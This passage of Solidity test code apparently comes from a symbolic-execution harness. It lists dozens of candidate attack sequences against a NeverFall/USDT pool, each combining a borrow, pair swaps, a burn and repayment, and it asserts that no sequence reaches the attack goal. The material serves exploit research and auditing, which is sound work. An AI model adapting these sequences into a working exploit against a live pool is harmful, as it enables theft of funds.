    function check_cand084(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_pair_attacker_neverFall_usdt(amt1, amt2);
        swap_pair_attacker_usdt_neverFall(amt3, amt4);
        swap_pair_attacker_neverFall_usdt(amt5, amt6);
        burn_neverFall_pair(amt7);
        swap_pair_attacker_usdt_neverFall(amt8, amt9);
        payback_neverFall_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand085(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_pair_attacker_neverFall_usdt(amt1, amt2);
        swap_pair_attacker_usdt_neverFall(amt3, amt4);
        swap_pair_attacker_neverFall_usdt(amt5, amt6);
        swap_pair_attacker_usdt_neverFall(amt7, amt8);
        swap_neverFall_attacker_usdt_neverFall(amt9, amt10);
        payback_neverFall_owner(amt11);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand086(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_pair_attacker_neverFall_usdt(amt1, amt2);
        swap_pair_attacker_usdt_neverFall(amt3, amt4);
        swap_pair_attacker_neverFall_usdt(amt5, amt6);
        swap_neverFall_attacker_usdt_neverFall(amt7, amt8);
        payback_neverFall_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand087(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_neverFall_owner(amt0);
        burn_neverFall_pair(amt1);
        swap_pair_attacker_neverFall_usdt(amt2, amt3);
        swap_pair_attacker_usdt_neverFall(amt4, amt5);
        swap_pair_attacker_neverFall_usdt(amt6, amt7);
        swap_neverFall_attacker_usdt_neverFall(amt8, amt9);
        payback_neverFall_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand088(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_pair_attacker_neverFall_usdt(amt1, amt2);
        burn_neverFall_pair(amt3);
        swap_pair_attacker_usdt_neverFall(amt4, amt5);
        swap_pair_attacker_neverFall_usdt(amt6, amt7);
        swap_neverFall_attacker_usdt_neverFall(amt8, amt9);
        payback_neverFall_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand089(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_pair_attacker_neverFall_usdt(amt1, amt2);
        swap_pair_attacker_usdt_neverFall(amt3, amt4);
        burn_neverFall_pair(amt5);
        swap_pair_attacker_neverFall_usdt(amt6, amt7);
        swap_neverFall_attacker_usdt_neverFall(amt8, amt9);
        payback_neverFall_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand090(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_pair_attacker_neverFall_usdt(amt1, amt2);
        swap_pair_attacker_usdt_neverFall(amt3, amt4);
        swap_neverFall_attacker_neverFall_usdt(amt5, amt6);
        swap_pair_attacker_usdt_neverFall(amt7, amt8);
        payback_neverFall_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand091(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_neverFall_owner(amt0);
        burn_neverFall_pair(amt1);
        swap_pair_attacker_neverFall_usdt(amt2, amt3);
        swap_pair_attacker_usdt_neverFall(amt4, amt5);
        swap_neverFall_attacker_neverFall_usdt(amt6, amt7);
        swap_pair_attacker_usdt_neverFall(amt8, amt9);
        payback_neverFall_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand092(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_pair_attacker_neverFall_usdt(amt1, amt2);
        burn_neverFall_pair(amt3);
        swap_pair_attacker_usdt_neverFall(amt4, amt5);
        swap_neverFall_attacker_neverFall_usdt(amt6, amt7);
        swap_pair_attacker_usdt_neverFall(amt8, amt9);
        payback_neverFall_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand093(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_pair_attacker_neverFall_usdt(amt1, amt2);
        swap_pair_attacker_usdt_neverFall(amt3, amt4);
        swap_neverFall_attacker_neverFall_usdt(amt5, amt6);
        burn_neverFall_pair(amt7);
        swap_pair_attacker_usdt_neverFall(amt8, amt9);
        payback_neverFall_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand094(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_pair_attacker_neverFall_usdt(amt1, amt2);
        swap_pair_attacker_usdt_neverFall(amt3, amt4);
        swap_neverFall_attacker_neverFall_usdt(amt5, amt6);
        swap_pair_attacker_usdt_neverFall(amt7, amt8);
        swap_neverFall_attacker_usdt_neverFall(amt9, amt10);
        payback_neverFall_owner(amt11);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand095(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_pair_attacker_neverFall_usdt(amt1, amt2);
        swap_pair_attacker_usdt_neverFall(amt3, amt4);
        swap_neverFall_attacker_neverFall_usdt(amt5, amt6);
        swap_neverFall_attacker_usdt_neverFall(amt7, amt8);
        payback_neverFall_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand096(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_neverFall_owner(amt0);
        burn_neverFall_pair(amt1);
        swap_pair_attacker_neverFall_usdt(amt2, amt3);
        swap_pair_attacker_usdt_neverFall(amt4, amt5);
        swap_neverFall_attacker_neverFall_usdt(amt6, amt7);
        swap_neverFall_attacker_usdt_neverFall(amt8, amt9);
        payback_neverFall_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand097(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_pair_attacker_neverFall_usdt(amt1, amt2);
        burn_neverFall_pair(amt3);
        swap_pair_attacker_usdt_neverFall(amt4, amt5);
        swap_neverFall_attacker_neverFall_usdt(amt6, amt7);
        swap_neverFall_attacker_usdt_neverFall(amt8, amt9);
        payback_neverFall_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand098(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_pair_attacker_neverFall_usdt(amt1, amt2);
        swap_neverFall_attacker_usdt_neverFall(amt3, amt4);
        swap_pair_attacker_neverFall_usdt(amt5, amt6);
        swap_pair_attacker_usdt_neverFall(amt7, amt8);
        payback_neverFall_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand099(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_neverFall_owner(amt0);
        burn_neverFall_pair(amt1);
        swap_pair_attacker_neverFall_usdt(amt2, amt3);
        swap_neverFall_attacker_usdt_neverFall(amt4, amt5);
        swap_pair_attacker_neverFall_usdt(amt6, amt7);
        swap_pair_attacker_usdt_neverFall(amt8, amt9);
        payback_neverFall_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand100(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_pair_attacker_neverFall_usdt(amt1, amt2);
        swap_neverFall_attacker_usdt_neverFall(amt3, amt4);
        burn_neverFall_pair(amt5);
        swap_pair_attacker_neverFall_usdt(amt6, amt7);
        swap_pair_attacker_usdt_neverFall(amt8, amt9);
        payback_neverFall_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand101(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_pair_attacker_neverFall_usdt(amt1, amt2);
        swap_neverFall_attacker_usdt_neverFall(amt3, amt4);
        swap_pair_attacker_neverFall_usdt(amt5, amt6);
        burn_neverFall_pair(amt7);
        swap_pair_attacker_usdt_neverFall(amt8, amt9);
        payback_neverFall_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand102(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_pair_attacker_neverFall_usdt(amt1, amt2);
        swap_neverFall_attacker_usdt_neverFall(amt3, amt4);
        swap_pair_attacker_neverFall_usdt(amt5, amt6);
        swap_neverFall_attacker_usdt_neverFall(amt7, amt8);
        payback_neverFall_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand103(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_neverFall_owner(amt0);
        burn_neverFall_pair(amt1);
        swap_pair_attacker_neverFall_usdt(amt2, amt3);
        swap_neverFall_attacker_usdt_neverFall(amt4, amt5);
        swap_pair_attacker_neverFall_usdt(amt6, amt7);
        swap_neverFall_attacker_usdt_neverFall(amt8, amt9);
        payback_neverFall_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand104(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_pair_attacker_neverFall_usdt(amt1, amt2);
        swap_neverFall_attacker_usdt_neverFall(amt3, amt4);
        burn_neverFall_pair(amt5);
        swap_pair_attacker_neverFall_usdt(amt6, amt7);
        swap_neverFall_attacker_usdt_neverFall(amt8, amt9);
        payback_neverFall_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand105(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_pair_attacker_neverFall_usdt(amt1, amt2);
        swap_neverFall_attacker_usdt_neverFall(amt3, amt4);
        swap_pair_attacker_neverFall_usdt(amt5, amt6);
        swap_neverFall_attacker_usdt_neverFall(amt7, amt8);
        swap_pair_attacker_usdt_neverFall(amt9, amt10);
        payback_neverFall_owner(amt11);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand106(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_pair_attacker_neverFall_usdt(amt1, amt2);
        swap_neverFall_attacker_usdt_neverFall(amt3, amt4);
        swap_neverFall_attacker_neverFall_usdt(amt5, amt6);
        swap_pair_attacker_usdt_neverFall(amt7, amt8);
        payback_neverFall_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand107(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_neverFall_owner(amt0);
        burn_neverFall_pair(amt1);
        swap_pair_attacker_neverFall_usdt(amt2, amt3);
        swap_neverFall_attacker_usdt_neverFall(amt4, amt5);
        swap_neverFall_attacker_neverFall_usdt(amt6, amt7);
        swap_pair_attacker_usdt_neverFall(amt8, amt9);
        payback_neverFall_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand108(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_pair_attacker_neverFall_usdt(amt1, amt2);
        swap_neverFall_attacker_usdt_neverFall(amt3, amt4);
        swap_neverFall_attacker_neverFall_usdt(amt5, amt6);
        burn_neverFall_pair(amt7);
        swap_pair_attacker_usdt_neverFall(amt8, amt9);
        payback_neverFall_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand109(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_pair_attacker_neverFall_usdt(amt1, amt2);
        swap_neverFall_attacker_usdt_neverFall(amt3, amt4);
        swap_neverFall_attacker_neverFall_usdt(amt5, amt6);
        swap_neverFall_attacker_usdt_neverFall(amt7, amt8);
        payback_neverFall_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand110(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_neverFall_owner(amt0);
        burn_neverFall_pair(amt1);
        swap_pair_attacker_neverFall_usdt(amt2, amt3);
        swap_neverFall_attacker_usdt_neverFall(amt4, amt5);
        swap_neverFall_attacker_neverFall_usdt(amt6, amt7);
        swap_neverFall_attacker_usdt_neverFall(amt8, amt9);
        payback_neverFall_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand111(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_pair_attacker_neverFall_usdt(amt1, amt2);
        swap_neverFall_attacker_usdt_neverFall(amt3, amt4);
        swap_neverFall_attacker_neverFall_usdt(amt5, amt6);
        swap_neverFall_attacker_usdt_neverFall(amt7, amt8);
        swap_pair_attacker_usdt_neverFall(amt9, amt10);
        payback_neverFall_owner(amt11);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand112(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_neverFall_attacker_neverFall_usdt(amt1, amt2);
        swap_pair_attacker_usdt_neverFall(amt3, amt4);
        swap_pair_attacker_neverFall_usdt(amt5, amt6);
        swap_pair_attacker_usdt_neverFall(amt7, amt8);
        payback_neverFall_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand113(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_neverFall_attacker_neverFall_usdt(amt1, amt2);
        burn_neverFall_pair(amt3);
        swap_pair_attacker_usdt_neverFall(amt4, amt5);
        swap_pair_attacker_neverFall_usdt(amt6, amt7);
        swap_pair_attacker_usdt_neverFall(amt8, amt9);
        payback_neverFall_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand114(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_neverFall_attacker_neverFall_usdt(amt1, amt2);
        swap_pair_attacker_usdt_neverFall(amt3, amt4);
        burn_neverFall_pair(amt5);
        swap_pair_attacker_neverFall_usdt(amt6, amt7);
        swap_pair_attacker_usdt_neverFall(amt8, amt9);
        payback_neverFall_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand115(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_neverFall_attacker_neverFall_usdt(amt1, amt2);
        swap_pair_attacker_usdt_neverFall(amt3, amt4);
        swap_pair_attacker_neverFall_usdt(amt5, amt6);
        burn_neverFall_pair(amt7);
        swap_pair_attacker_usdt_neverFall(amt8, amt9);
        payback_neverFall_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand116(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_neverFall_attacker_neverFall_usdt(amt1, amt2);
        swap_pair_attacker_usdt_neverFall(amt3, amt4);
        swap_pair_attacker_neverFall_usdt(amt5, amt6);
        swap_pair_attacker_usdt_neverFall(amt7, amt8);
        swap_neverFall_attacker_usdt_neverFall(amt9, amt10);
        payback_neverFall_owner(amt11);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand117(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_neverFall_attacker_neverFall_usdt(amt1, amt2);
        swap_pair_attacker_usdt_neverFall(amt3, amt4);
        swap_pair_attacker_neverFall_usdt(amt5, amt6);
        swap_neverFall_attacker_usdt_neverFall(amt7, amt8);
        payback_neverFall_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand118(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_neverFall_attacker_neverFall_usdt(amt1, amt2);
        burn_neverFall_pair(amt3);
        swap_pair_attacker_usdt_neverFall(amt4, amt5);
        swap_pair_attacker_neverFall_usdt(amt6, amt7);
        swap_neverFall_attacker_usdt_neverFall(amt8, amt9);
        payback_neverFall_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand119(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_neverFall_attacker_neverFall_usdt(amt1, amt2);
        swap_pair_attacker_usdt_neverFall(amt3, amt4);
        burn_neverFall_pair(amt5);
        swap_pair_attacker_neverFall_usdt(amt6, amt7);
        swap_neverFall_attacker_usdt_neverFall(amt8, amt9);
        payback_neverFall_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand120(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_neverFall_attacker_neverFall_usdt(amt1, amt2);
        swap_pair_attacker_usdt_neverFall(amt3, amt4);
        swap_neverFall_attacker_neverFall_usdt(amt5, amt6);
        swap_pair_attacker_usdt_neverFall(amt7, amt8);
        payback_neverFall_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand121(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_neverFall_attacker_neverFall_usdt(amt1, amt2);
        burn_neverFall_pair(amt3);
        swap_pair_attacker_usdt_neverFall(amt4, amt5);
        swap_neverFall_attacker_neverFall_usdt(amt6, amt7);
        swap_pair_attacker_usdt_neverFall(amt8, amt9);
        payback_neverFall_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand122(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_neverFall_attacker_neverFall_usdt(amt1, amt2);
        swap_pair_attacker_usdt_neverFall(amt3, amt4);
        swap_neverFall_attacker_neverFall_usdt(amt5, amt6);
        burn_neverFall_pair(amt7);
        swap_pair_attacker_usdt_neverFall(amt8, amt9);
        payback_neverFall_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand123(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_neverFall_attacker_neverFall_usdt(amt1, amt2);
        swap_pair_attacker_usdt_neverFall(amt3, amt4);
        swap_neverFall_attacker_neverFall_usdt(amt5, amt6);
        swap_pair_attacker_usdt_neverFall(amt7, amt8);
        swap_neverFall_attacker_usdt_neverFall(amt9, amt10);
        payback_neverFall_owner(amt11);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand124(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_neverFall_attacker_neverFall_usdt(amt1, amt2);
        swap_pair_attacker_usdt_neverFall(amt3, amt4);
        swap_neverFall_attacker_neverFall_usdt(amt5, amt6);
        swap_neverFall_attacker_usdt_neverFall(amt7, amt8);
        payback_neverFall_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand125(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_neverFall_attacker_neverFall_usdt(amt1, amt2);
        burn_neverFall_pair(amt3);
        swap_pair_attacker_usdt_neverFall(amt4, amt5);
        swap_neverFall_attacker_neverFall_usdt(amt6, amt7);
        swap_neverFall_attacker_usdt_neverFall(amt8, amt9);
        payback_neverFall_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand126(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_neverFall_attacker_neverFall_usdt(amt1, amt2);
        swap_neverFall_attacker_usdt_neverFall(amt3, amt4);
        swap_pair_attacker_neverFall_usdt(amt5, amt6);
        swap_pair_attacker_usdt_neverFall(amt7, amt8);
        payback_neverFall_owner(amt9);
        assert(!attackGoal());
